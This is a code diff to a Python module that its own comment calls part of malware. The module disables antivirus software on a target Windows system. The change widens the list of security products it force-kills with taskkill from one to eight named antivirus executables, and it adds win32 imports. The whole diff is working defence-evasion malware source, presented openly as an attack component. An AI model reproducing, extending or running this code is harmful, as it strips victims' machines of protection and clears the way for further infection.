@@ -1,5 +1,7 @@
 #!/usr/bin/python3.8
 import subprocess
+import win32con
+import win32gui
 
 '''
 THIS MODULE SEARCHES FOR RUNNING ANTIVIRUS SOFTWARE IN THE TARGET SYSTEM AND KILLS IT
@@ -9,7 +11,8 @@ THIS IS DONE TO PREVENT INTERRUPTION FROM ANTIVIRUS SOFTWARE AND ALLOW THE MALWA
 
 
 def av_kill():
-    avs = ['avast.exe']
+    avs = ['avast.exe', 'avg.exe', 'McAfee.exe', 'avira.exe', 'BitDefender.exe',
+           'sophos.exe', '360.exe', 'kaspersky.exe']
 
     for av in avs:
         cmd = f'taskkill /IM {av} /F'
